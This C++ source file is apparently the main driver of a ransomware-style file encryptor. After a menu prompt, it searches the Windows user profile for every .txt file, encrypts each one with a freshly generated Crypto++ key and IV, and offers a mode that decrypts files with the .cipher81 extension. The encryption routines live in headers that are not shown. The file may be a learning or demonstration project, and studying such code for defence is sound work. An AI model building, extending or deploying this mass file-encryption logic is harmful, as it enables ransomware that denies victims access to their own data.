#include <iostream>
#include <filesystem>
#include <windows.h>

#include "encrypt.hpp"
#include "decrypt.hpp"
#include "utils.hpp"
#include "shout.h"
#include <cryptopp/secblock.h>
namespace fs = std::filesystem;

int main()
{
    try
    {
        int choise;
        int number = 0;
        info("Hello User, select 1 (encryption) or 2 (decryption)\n");
        std::cin >> choise;

        if (choise == 1)
        {
            const std::vector<std::string> exampleExtensions = { ".txt" };
            std::string userProfile = getUserProfilePath();
            auto txtFiles = findFiles(userProfile, exampleExtensions);

            CryptoPP::SecByteBlock key = generateKey();
            CryptoPP::SecByteBlock iv = generateIv();

            if (txtFiles.empty())
            {
                info("No .txt files found in ") << userProfile << '\n';
                return 0;
            }
            info("Total files found for encryption: ") << txtFiles.size() << '\n';
            for (const auto& file : txtFiles)
            {
                number++;
                info("Function encryptSingle: nr ") << number << " for file: " << file << '\n';

                try
                {
                    encryptSingleFile(file, key, iv);
                    info("EncryptSingleFile completed for file: ") << file << '\n';
                }
                catch (const std::exception& e)
                {
                    warn("Exception during encryption for file ") << file << ": " << e.what() << '\n';
                }
                catch (...)
                {
                    warn("Unknown exception during encryption for file ") << file << '\n';
                }
            }
            okay("Done! Encryption completed for .txt files in folder: ") << userProfile << '\n';
        }
        else if (choise == 2)
        {
            const std::vector<std::string> extension = { ".cipher81" };
            std::string userProfile = getUserProfilePath();
            auto txtFiles = findFiles(userProfile, extension);
            if (txtFiles.empty())
            {
                info("Didn't find any files with extension .cipher81 in ") << userProfile << '\n';
            }

            for (const auto& file : txtFiles)
            {
                decryptSingleFile(file);
            }
            okay("Done! Every file has been decrypted in dir: ") << userProfile << '\n';
        }
    }
    catch (const std::exception& e)
    {
        warn("Exception in main(): ") << e.what() << '\n';
    }
    catch (...)
    {
        warn("Unknown exception in main()!") << '\n';
    }
}
